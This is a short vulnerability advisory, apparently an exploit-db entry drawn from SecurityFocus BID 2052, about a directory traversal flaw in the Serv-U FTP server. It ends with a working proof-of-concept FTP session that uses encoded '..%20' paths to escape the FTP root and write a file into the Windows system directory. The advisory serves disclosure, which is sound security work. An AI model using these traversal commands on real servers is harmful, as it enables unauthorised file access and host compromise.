@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/2052/info
+
+FTP Serv-U is an internet FTP server from CatSoft.
+
+Authenticated users can gain access to the ftproot of the drive where Serv-U FTP has been installed. Users that have read, write, execute and list access in the home directory will have the same permissions to any file which resides on the same partition as the ftproot, once a user is in the home directory they can successfully transfer any files using specially crafted GET requests. All hidden files will be revealed even if the 'Hide hidden files' feature is on.
+
+Successful exploitation of this vulnerability could enable a remote user to gain access to systems files, password files, etc. This could lead to a complete compromise of the host. 
+
+ftp> cd \..%20.
+250 Directory changed to /..
+
+ftp> cd %20..%20%20../winnt 250 Directory changed to /c:/TOMB/../WINNT
+ftp> put autoexec.bat %20..%20%20../winnt/2.bat
+200 PORT Command successful.
+150 Opening ASCII mode data connection for 2.bat.
+226 Transfer complete.
+ftp> dir \..%20.\..%20.\winnt\ 
